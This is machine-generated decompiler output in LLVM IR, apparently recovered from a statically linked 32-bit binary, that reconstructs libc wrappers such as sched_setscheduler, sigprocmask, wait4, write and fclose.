define i32 @sched_getparam(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_80501f4 = load i32, i32* @ebx, align 4
  store i32 %v0_80501f4, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v4_8050207 = call i32 @sched_getparam(i32 %v0_80501f4, i32 %tmp4, i32 %arg1, i32 %arg2)
  store i32 %v4_8050207, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v4_8050207, -4095
  br i1 %tmp, label %dec_label_pc_8050220, label %dec_label_pc_8050214

dec_label_pc_8050214:                             ; preds = %entry
  %v0_8050214 = load i32, i32* %stack_var_-4, align 4
  %v1_8050214 = call i32 @__errno_location(i32 %v0_8050214)
  %v0_8050219 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8050219 = sub i32 0, %v0_8050219
  %v2_805021b = inttoptr i32 %v1_8050214 to i32*
  store i32 %v1_8050219, i32* %v2_805021b, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8050220

dec_label_pc_8050220:                             ; preds = %entry, %dec_label_pc_8050214
  %v0_8050221 = phi i32 [ %v4_8050207, %entry ], [ -1, %dec_label_pc_8050214 ]
  %v2_8050224 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8050224, i32* @ebx, align 4
  ret i32 %v0_8050221

; uselistorder directives
  uselistorder i32 %v4_8050207, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32)* @sched_getparam, { 2, 0, 1 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8050220, { 1, 0 }
}

define i32 @sched_getscheduler(i32 %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8050228 = load i32, i32* @edi, align 4
  store i32 %v0_8050228, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @edi, align 4
  %v0_8050230 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_8050238 = call i32 @sched_getscheduler(i32 %v0_8050230)
  store i32 %v0_8050230, i32* @ebx, align 4
  store i32 %v1_8050238, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8050238, -4095
  br i1 %tmp, label %dec_label_pc_8050250, label %dec_label_pc_8050244

dec_label_pc_8050244:                             ; preds = %entry
  %v1_8050244 = call i32 @__errno_location(i32 %v0_8050230)
  %v0_8050249 = load i32, i32* %edi.global-to-local, align 4
  %v1_8050249 = sub i32 0, %v0_8050249
  %v2_805024b = inttoptr i32 %v1_8050244 to i32*
  store i32 %v1_8050249, i32* %v2_805024b, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8050250

dec_label_pc_8050250:                             ; preds = %entry, %dec_label_pc_8050244
  %v0_8050251 = phi i32 [ %v1_8050238, %entry ], [ -1, %dec_label_pc_8050244 ]
  %v2_8050254 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8050254, i32* @edi, align 4
  ret i32 %v0_8050251

; uselistorder directives
  uselistorder i32 %v1_8050238, { 1, 0, 2 }
  uselistorder i32 %v0_8050230, { 1, 0, 2 }
  uselistorder i32 (i32)* @sched_getscheduler, { 2, 0, 1 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8050250, { 1, 0 }
}

define i32 @sched_setscheduler(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp8, i32* %stack_var_-12, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8050258 = load i32, i32* @edi, align 4
  store i32 %v0_8050258, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @edi, align 4
  %v0_8050268 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v3_8050270 = call i32 @sched_setscheduler(i32 %v0_8050268, i32 %tmp8, i32 %tmp6)
  store i32 %v0_8050268, i32* @ebx, align 4
  store i32 %v3_8050270, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v3_8050270, -4095
  br i1 %tmp, label %dec_label_pc_8050288, label %dec_label_pc_805027c

dec_label_pc_805027c:                             ; preds = %entry
  %v1_805027c = call i32 @__errno_location(i32 %v0_8050268)
  %v0_8050281 = load i32, i32* %edi.global-to-local, align 4
  %v1_8050281 = sub i32 0, %v0_8050281
  %v2_8050283 = inttoptr i32 %v1_805027c to i32*
  store i32 %v1_8050281, i32* %v2_8050283, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8050288

dec_label_pc_8050288:                             ; preds = %entry, %dec_label_pc_805027c
  %v0_8050289 = phi i32 [ %v3_8050270, %entry ], [ -1, %dec_label_pc_805027c ]
  %v2_8050288 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8050288, i32* @edx, align 4
  %v2_805028c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805028c, i32* @edi, align 4
  ret i32 %v0_8050289

; uselistorder directives
  uselistorder i32 %v3_8050270, { 1, 0, 2 }
  uselistorder i32 %v0_8050268, { 1, 0, 2 }
  uselistorder i32* %stack_var_-12, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @sched_setscheduler, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_8050288, { 1, 0 }
}

define i32 @sched_yield(i32 %arg1) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8050290 = load i32, i32* @ebx, align 4
  store i32 %v0_8050290, i32* %stack_var_-4, align 4
  %v1_8050299 = call i32 @sched_yield(i32 %v0_8050290)
  store i32 %v1_8050299, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8050299, -4095
  br i1 %tmp, label %dec_label_pc_80502b0, label %dec_label_pc_80502a4

dec_label_pc_80502a4:                             ; preds = %entry
  %v0_80502a4 = load i32, i32* %stack_var_-4, align 4
  %v1_80502a4 = call i32 @__errno_location(i32 %v0_80502a4)
  %v0_80502a9 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80502a9 = sub i32 0, %v0_80502a9
  %v2_80502ab = inttoptr i32 %v1_80502a4 to i32*
  store i32 %v1_80502a9, i32* %v2_80502ab, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80502b0

dec_label_pc_80502b0:                             ; preds = %entry, %dec_label_pc_80502a4
  %v0_80502b1 = phi i32 [ %v1_8050299, %entry ], [ -1, %dec_label_pc_80502a4 ]
  %v2_80502b0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80502b0, i32* @edx, align 4
  %v2_80502b4 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80502b4, i32* @ebx, align 4
  ret i32 %v0_80502b1

; uselistorder directives
  uselistorder i32 %v1_8050299, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 (i32)* @sched_yield, { 1, 0 }
  uselistorder label %dec_label_pc_80502b0, { 1, 0 }
}

define i32 @__libc_select(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_80502b9 = load i32, i32* @esi, align 4
  store i32 %v0_80502b9, i32* %stack_var_-8, align 4
  store i32 %arg2, i32* @ecx, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v0_80502d1 = load i32, i32* @ebx, align 4
  %v1_80502d9 = call i32 @int80_syscall(i32 142)
  store i32 %v0_80502d1, i32* @ebx, align 4
  store i32 %v1_80502d9, i32* %esi.global-to-local, align 4
  %tmp = icmp ult i32 %v1_80502d9, -4095
  br i1 %tmp, label %dec_label_pc_80502f1, label %dec_label_pc_80502e5

dec_label_pc_80502e5:                             ; preds = %entry
  %v1_80502e5 = call i32 @__errno_location(i32 %v0_80502d1)
  %v0_80502ea = load i32, i32* %esi.global-to-local, align 4
  %v1_80502ea = sub i32 0, %v0_80502ea
  %v2_80502ec = inttoptr i32 %v1_80502e5 to i32*
  store i32 %v1_80502ea, i32* %v2_80502ec, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80502f1

dec_label_pc_80502f1:                             ; preds = %entry, %dec_label_pc_80502e5
  %v0_80502f2 = phi i32 [ %v1_80502d9, %entry ], [ -1, %dec_label_pc_80502e5 ]
  %v2_80502f4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80502f4, i32* @esi, align 4
  ret i32 %v0_80502f2

; uselistorder directives
  uselistorder i32 %v1_80502d9, { 1, 0, 2 }
  uselistorder i32 %v0_80502d1, { 1, 0 }
  uselistorder label %dec_label_pc_80502f1, { 1, 0 }
}

define i32 @__GI_setrlimit(i32 %arg1, %rlimit* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80502f8 = load i32, i32* @ebx, align 4
  store i32 %v0_80502f8, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v4_805030b = call i32 @setrlimit(i32 %arg1, %rlimit* %arg2)
  store i32 %v4_805030b, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v4_805030b, -4095
  br i1 %tmp, label %dec_label_pc_8050324, label %dec_label_pc_8050318

dec_label_pc_8050318:                             ; preds = %entry
  %v0_8050318 = load i32, i32* %stack_var_-4, align 4
  %v1_8050318 = call i32 @__errno_location(i32 %v0_8050318)
  %v0_805031d = load i32, i32* %ebx.global-to-local, align 4
  %v1_805031d = sub i32 0, %v0_805031d
  %v2_805031f = inttoptr i32 %v1_8050318 to i32*
  store i32 %v1_805031d, i32* %v2_805031f, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8050324

dec_label_pc_8050324:                             ; preds = %entry, %dec_label_pc_8050318
  %v0_8050325 = phi i32 [ %v4_805030b, %entry ], [ -1, %dec_label_pc_8050318 ]
  %v2_8050328 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8050328, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8050325

; uselistorder directives
  uselistorder i32 %v4_805030b, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8050324, { 1, 0 }
}

define i32 @__GI_sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp4 = inttoptr i32 %arg3 to %_TYPEDEF_sigset_t*
  %stack_var_-12 = alloca i32, align 4
  %v0_805032d = load i32, i32* @esi, align 4
  %v4_8050331 = ptrtoint %_TYPEDEF_sigset_t* %arg2 to i32
  store i32 %v4_8050331, i32* @ecx, align 4
  %v2_805033d = icmp eq %_TYPEDEF_sigset_t* %arg2, null
  br i1 %v2_805033d, label %dec_label_pc_8050356, label %dec_label_pc_8050341

dec_label_pc_8050341:                             ; preds = %entry
  %tmp = icmp ult i32 %arg1, 3
  br i1 %tmp, label %dec_label_pc_8050356, label %dec_label_pc_8050346

dec_label_pc_8050346:                             ; preds = %dec_label_pc_8050341
  %v1_8050346 = call i32 @__errno_location(i32 %v0_805032d)
  %v1_805034b = inttoptr i32 %v1_8050346 to i32*
  store i32 22, i32* %v1_805034b, align 4
  br label %dec_label_pc_805037d

dec_label_pc_8050356:                             ; preds = %dec_label_pc_8050341, %entry
  store i32 8, i32* %esi.global-to-local, align 4
  %v0_805035b = load i32, i32* @ebx, align 4
  %v7_8050363 = call i32 @sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, %_TYPEDEF_sigset_t* %tmp4)
  store i32 %v0_805035b, i32* @ebx, align 4
  store i32 %v7_8050363, i32* %esi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v7_8050363, -4095
  br i1 %tmp12, label %dec_label_pc_805037d, label %dec_label_pc_805036f

dec_label_pc_805036f:                             ; preds = %dec_label_pc_8050356
  %v1_805036f = call i32 @__errno_location(i32 %v0_805035b)
  %v0_8050374 = load i32, i32* %esi.global-to-local, align 4
  %v1_8050374 = sub i32 0, %v0_8050374
  %v2_8050376 = inttoptr i32 %v1_805036f to i32*
  store i32 %v1_8050374, i32* %v2_8050376, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_805037d

dec_label_pc_805037d:                             ; preds = %dec_label_pc_805036f, %dec_label_pc_8050356, %dec_label_pc_8050346
  %storemerge = phi i32 [ -1, %dec_label_pc_8050346 ], [ %v7_8050363, %dec_label_pc_8050356 ], [ -1, %dec_label_pc_805036f ]
  %v2_805037d = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805037d, i32* @edx, align 4
  store i32 %v0_805032d, i32* @esi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v7_8050363, { 1, 0, 2 }
  uselistorder i32 %v0_805035b, { 1, 0 }
  uselistorder i32* %esi.global-to-local, { 1, 2, 3, 0 }
  uselistorder %_TYPEDEF_sigset_t* %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @__libc_sigsuspend(%_TYPEDEF_sigset_t* %arg1) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8050384 = load i32, i32* @ebx, align 4
  store i32 %v0_8050384, i32* %stack_var_-4, align 4
  %v4_805038d = ptrtoint %_TYPEDEF_sigset_t* %arg1 to i32
  store i32 %v4_805038d, i32* %ebx.global-to-local, align 4
  %v3_8050398 = call i32 @sigsuspend(%_TYPEDEF_sigset_t* %arg1)
  store i32 %v3_8050398, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v3_8050398, -4095
  br i1 %tmp, label %dec_label_pc_80503b1, label %dec_label_pc_80503a5

dec_label_pc_80503a5:                             ; preds = %entry
  %v0_80503a5 = load i32, i32* %stack_var_-4, align 4
  %v1_80503a5 = call i32 @__errno_location(i32 %v0_80503a5)
  %v0_80503aa = load i32, i32* %ebx.global-to-local, align 4
  %v1_80503aa = sub i32 0, %v0_80503aa
  %v2_80503ac = inttoptr i32 %v1_80503a5 to i32*
  store i32 %v1_80503aa, i32* %v2_80503ac, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80503b1

dec_label_pc_80503b1:                             ; preds = %entry, %dec_label_pc_80503a5
  %v0_80503b2 = phi i32 [ %v3_8050398, %entry ], [ -1, %dec_label_pc_80503a5 ]
  %v2_80503b1 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80503b1, i32* @edx, align 4
  %v2_80503b5 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80503b5, i32* @ebx, align 4
  ret i32 %v0_80503b2

; uselistorder directives
  uselistorder i32 %v3_8050398, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder %_TYPEDEF_sigset_t* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80503b1, { 1, 0 }
}

define i32 @__GI_time(i32* %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %tmp3 = ptrtoint i32* %arg1 to i32
  %stack_var_-4 = alloca i32, align 4
  %v0_80503b8 = load i32, i32* @edi, align 4
  store i32 %v0_80503b8, i32* %stack_var_-4, align 4
  store i32 %tmp3, i32* %edi.global-to-local, align 4
  %v0_80503c0 = load i32, i32* @ebx, align 4
  %v2_80503c8 = call i32 @time(i32* %arg1)
  store i32 %v0_80503c0, i32* @ebx, align 4
  store i32 %v2_80503c8, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v2_80503c8, -4095
  br i1 %tmp, label %dec_label_pc_80503e0, label %dec_label_pc_80503d4

dec_label_pc_80503d4:                             ; preds = %entry
  %v1_80503d4 = call i32 @__errno_location(i32 %v0_80503c0)
  %v0_80503d9 = load i32, i32* %edi.global-to-local, align 4
  %v1_80503d9 = sub i32 0, %v0_80503d9
  %v2_80503db = inttoptr i32 %v1_80503d4 to i32*
  store i32 %v1_80503d9, i32* %v2_80503db, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_80503e0

dec_label_pc_80503e0:                             ; preds = %entry, %dec_label_pc_80503d4
  %v0_80503e1 = phi i32 [ %v2_80503c8, %entry ], [ -1, %dec_label_pc_80503d4 ]
  %v2_80503e4 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80503e4, i32* @edi, align 4
  ret i32 %v0_80503e1

; uselistorder directives
  uselistorder i32 %v2_80503c8, { 1, 0, 2 }
  uselistorder i32 %v0_80503c0, { 1, 0 }
  uselistorder label %dec_label_pc_80503e0, { 1, 0 }
}

define i32 @__libc_wait(i32 %arg1) local_unnamed_addr {
entry:
  %v4_80503f5 = call i32 @wait4(i32 -1, i32 %arg1, i32 0, i32 0)
  ret i32 %v4_80503f5
}

define i32 @wait4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_8050400 = load i32, i32* @edi, align 4
  %v0_8050401 = load i32, i32* @esi, align 4
  store i32 %v0_8050401, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* @edi, align 4
  store i32 %arg4, i32* @esi, align 4
  %v0_8050415 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v4_805041d = call i32 @wait4(i32 %v0_8050415, i32 %v0_8050401, i32 %v0_8050400, i32 %tmp5)
  store i32 %v0_8050415, i32* @ebx, align 4
  store i32 %v4_805041d, i32* %esi.global-to-local, align 4
  %tmp = icmp ult i32 %v4_805041d, -4095
  br i1 %tmp, label %dec_label_pc_8050435, label %dec_label_pc_8050429

dec_label_pc_8050429:                             ; preds = %entry
  %v1_8050429 = call i32 @__errno_location(i32 %v0_8050415)
  %v0_805042e = load i32, i32* %esi.global-to-local, align 4
  %v1_805042e = sub i32 0, %v0_805042e
  %v2_8050430 = inttoptr i32 %v1_8050429 to i32*
  store i32 %v1_805042e, i32* %v2_8050430, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8050435

dec_label_pc_8050435:                             ; preds = %entry, %dec_label_pc_8050429
  %v0_8050436 = phi i32 [ %v4_805041d, %entry ], [ -1, %dec_label_pc_8050429 ]
  %v2_8050438 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8050438, i32* @esi, align 4
  store i32 %v0_8050400, i32* @edi, align 4
  ret i32 %v0_8050436

; uselistorder directives
  uselistorder i32 %v4_805041d, { 1, 0, 2 }
  uselistorder i32 %v0_8050415, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8050435, { 1, 0 }
}

define i32 @__libc_waitpid(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v4_805044d = call i32 @wait4(i32 %arg1, i32 %arg2, i32 %arg3, i32 0)
  ret i32 %v4_805044d
}

define i32 @__libc_write(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp8, i32* %stack_var_-12, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8050458 = load i32, i32* @edi, align 4
  store i32 %v0_8050458, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @edi, align 4
  store i32 %arg2, i32* @ecx, align 4
  %v0_8050468 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v3_8050470 = call i32 @write(i32 %v0_8050468, i32 %tmp8, i32 %tmp6)
  store i32 %v0_8050468, i32* @ebx, align 4
  store i32 %v3_8050470, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v3_8050470, -4095
  br i1 %tmp, label %dec_label_pc_8050488, label %dec_label_pc_805047c

dec_label_pc_805047c:                             ; preds = %entry
  %v1_805047c = call i32 @__errno_location(i32 %v0_8050468)
  %v0_8050481 = load i32, i32* %edi.global-to-local, align 4
  %v1_8050481 = sub i32 0, %v0_8050481
  %v2_8050483 = inttoptr i32 %v1_805047c to i32*
  store i32 %v1_8050481, i32* %v2_8050483, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8050488

dec_label_pc_8050488:                             ; preds = %entry, %dec_label_pc_805047c
  %v0_8050489 = phi i32 [ %v3_8050470, %entry ], [ -1, %dec_label_pc_805047c ]
  %v2_8050488 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8050488, i32* @edx, align 4
  store i32 %tmp6, i32* @ecx, align 4
  %v2_805048c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805048c, i32* @edi, align 4
  ret i32 %v0_8050489

; uselistorder directives
  uselistorder i32 %v3_8050470, { 1, 0, 2 }
  uselistorder i32 %v0_8050468, { 1, 0, 2 }
  uselistorder i32* %stack_var_-12, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @write, { 1, 0 }
  uselistorder label %dec_label_pc_8050488, { 1, 0 }
}

define i32 @__GI_toupper(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @edx, align 4
  %v1_8050494 = add i32 %arg1, 128
  %v6_805049f = icmp ugt i32 %v1_8050494, 383
  br i1 %v6_805049f, label %dec_label_pc_80504aa, label %dec_label_pc_80504a1

dec_label_pc_80504a1:                             ; preds = %entry
  %v0_80504a1 = load i32, i32* inttoptr (i32 134622052 to i32*), align 4
  %v2_80504a6 = mul i32 %arg1, 2
  %v3_80504a6 = add i32 %v0_80504a1, %v2_80504a6
  %v4_80504a6 = inttoptr i32 %v3_80504a6 to i16*
  %v5_80504a6 = load i16, i16* %v4_80504a6, align 2
  %v6_80504a6 = sext i16 %v5_80504a6 to i32
  store i32 %v6_80504a6, i32* @edx, align 4
  br label %dec_label_pc_80504aa

dec_label_pc_80504aa:                             ; preds = %entry, %dec_label_pc_80504a1
  %v0_80504aa = phi i32 [ %arg1, %entry ], [ %v6_80504a6, %dec_label_pc_80504a1 ]
  ret i32 %v0_80504aa

; uselistorder directives
  uselistorder label %dec_label_pc_80504aa, { 1, 0 }
}

define i32 @__GI_fclose(i16* %arg1) local_unnamed_addr {
entry:
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_80504b0 = load i32, i32* @ebp, align 4
  %v0_80504b1 = load i32, i32* @edi, align 4
  %v0_80504b2 = load i32, i32* @esi, align 4
  %v0_80504b3 = load i32, i32* @ebx, align 4
  %v4_80504b7 = ptrtoint i16* %arg1 to i32
  store i32 %v4_80504b7, i32* @esi, align 4
  %v1_80504bb = add i32 %v4_80504b7, 52
  %v2_80504bb = inttoptr i32 %v1_80504bb to i32*
  %v3_80504bb = load i32, i32* %v2_80504bb, align 4
  store i32 %v3_80504bb, i32* @ebp, align 4
  %v1_80504be = icmp eq i32 %v3_80504bb, 0
  %v1_80504c0 = icmp eq i1 %v1_80504be, false
  br i1 %v1_80504c0, label %dec_label_pc_80504e1, label %dec_label_pc_80504c2

dec_label_pc_80504c2:                             ; preds = %entry
  %v1_80504c2 = add i32 %v4_80504b7, 56
  store i32 %v1_80504c2, i32* @ebx, align 4
  %v4_80504d1 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-32, i32 134541533, i32 %v1_80504c2)
  %v0_80504d6 = load i32, i32* @ebx, align 4
  %v1_80504d9 = call i32 @pthread_mutex_lock(i32 %v0_80504d6)
  %v0_80504e3.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80504e1

dec_label_pc_80504e1:                             ; preds = %entry, %dec_label_pc_80504c2
  %v0_80504eb = phi i32 [ %v4_80504b7, %entry ], [ %v0_80504e3.pre, %dec_label_pc_80504c2 ]
  store i32 0, i32* @edi, align 4
  %v1_80504e3 = inttoptr i32 %v0_80504eb to i8*
  %v2_80504e3 = load i8, i8* %v1_80504e3, align 1
  %v3_80504e3 = and i8 %v2_80504e3, 64
  %v4_80504e3 = icmp eq i8 %v3_80504e3, 0
  br i1 %v4_80504e3, label %dec_label_pc_80504e1.dec_label_pc_80504f6_crit_edge, label %dec_label_pc_80504e8

dec_label_pc_80504e1.dec_label_pc_80504f6_crit_edge: ; preds = %dec_label_pc_80504e1
  br label %dec_label_pc_80504f6

dec_label_pc_80504e8:                             ; preds = %dec_label_pc_80504e1
  %v1_80504ec = inttoptr i32 %v0_80504eb to i16*
  %v2_80504ec = call i32 @fflush_unlocked(i16* %v1_80504ec)
  store i32 %v2_80504ec, i32* @edi, align 4
  %v0_80504f9.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80504f6

dec_label_pc_80504f6:                             ; preds = %dec_label_pc_80504e1.dec_label_pc_80504f6_crit_edge, %dec_label_pc_80504e8
  %v0_80504f9 = phi i32 [ %v0_80504eb, %dec_label_pc_80504e1.dec_label_pc_80504f6_crit_edge ], [ %v0_80504f9.pre, %dec_label_pc_80504e8 ]
  %v1_80504f9 = add i32 %v0_80504f9, 4
  %v2_80504f9 = inttoptr i32 %v1_80504f9 to i32*
  %v3_80504f9 = load i32, i32* %v2_80504f9, align 4
  %v1_80504fc = call i32 @__libc_close(i32 %v3_80504f9)
  %v0_8050504 = load i32, i32* @esi, align 4
  %v1_8050504 = add i32 %v0_8050504, 4
  %v2_8050504 = inttoptr i32 %v1_8050504 to i32*
  store i32 -1, i32* %v2_8050504, align 4
  %v2_8050515 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_8050515, i32* @ebx, align 4
  %v2_805051a = icmp slt i32 %v1_80504fc, 0
  %v1_8050521 = load i32, i32* @edi, align 4
  %v3_8050521 = select i1 %v2_805051a, i32 -1, i32 %v1_8050521
  store i32 %v3_8050521, i32* @edi, align 4
  %v4_8050524 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-48, i32 134541533, i32 ptrtoint (i32* @global_var_8062b98.203 to i32))
  %v1_8050530 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8062b98.203 to i32))
  %v0_8050535 = load i32, i32* @global_var_806541c.204, align 4
  %v1_805053a = add i32 %v0_8050535, 1
  store i32 %v1_805053a, i32* @global_var_806541c.204, align 4
  %v3_8050545 = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-48, i32 1)
  %v0_805054a = load i32, i32* @esi, align 4
  %v1_805054a = inttoptr i32 %v0_805054a to i32*
  %v2_805054a = load i32, i32* %v1_805054a, align 4
  %v1_805054f = and i32 %v2_805054a, 24576
  %v1_8050554 = or i32 %v1_805054f, 48
  %v1_8050559 = trunc i32 %v1_8050554 to i16
  %v3_8050559 = inttoptr i32 %v0_805054a to i16*
  store i16 %v1_8050559, i16* %v3_8050559, align 2
  br i1 %v1_80504c0, label %dec_label_pc_805056f, label %dec_label_pc_805055e

dec_label_pc_805055e:                             ; preds = %dec_label_pc_80504f6
  %v3_8050567 = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-32, i32 1)
  br label %dec_label_pc_805056f

dec_label_pc_805056f:                             ; preds = %dec_label_pc_80504f6, %dec_label_pc_805055e
  %v0_805056f = load i32, i32* @esi, align 4
  %v1_805056f = add i32 %v0_805056f, 1
  %v2_805056f = inttoptr i32 %v1_805056f to i8*
  %v3_805056f = load i8, i8* %v2_805056f, align 1
  %v4_805056f = and i8 %v3_805056f, 64
  %v5_805056f = icmp eq i8 %v4_805056f, 0
  br i1 %v5_805056f, label %dec_label_pc_8050583, label %dec_label_pc_8050575

dec_label_pc_8050575:                             ; preds = %dec_label_pc_805056f
  %v1_8050578 = add i32 %v0_805056f, 8
  %v2_8050578 = inttoptr i32 %v1_8050578 to i32*
  %v3_8050578 = load i32, i32* %v2_8050578, align 4
  %v1_805057b = call i32 @free(i32 %v3_8050578)
  br label %dec_label_pc_8050583

dec_label_pc_8050583:                             ; preds = %dec_label_pc_805056f, %dec_label_pc_8050575
  %v4_805058f = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-48, i32 134541533, i32 ptrtoint (i32* @global_var_8062b98.203 to i32))
  %v1_805059b = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8062b98.203 to i32))
  %v0_80505a1 = load i32, i32* @global_var_8065420.205, align 32
  %v1_80505a1 = add i32 %v0_80505a1, 1
  store i32 %v1_80505a1, i32* @global_var_8065420.205, align 32
  %v3_80505ab = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-48, i32 1)
  %v0_80505b0 = call i32 @_stdio_openlist_dec_use()
  %v0_80505b8 = load i32, i32* @edi, align 4
  store i32 %v0_80504b3, i32* @ebx, align 4
  store i32 %v0_80504b2, i32* @esi, align 4
  store i32 %v0_80504b1, i32* @edi, align 4
  store i32 %v0_80504b0, i32* @ebp, align 4
  ret i32 %v0_80505b8

; uselistorder directives
  uselistorder i32* %stack_var_-48, { 1, 2, 3, 0, 4 }
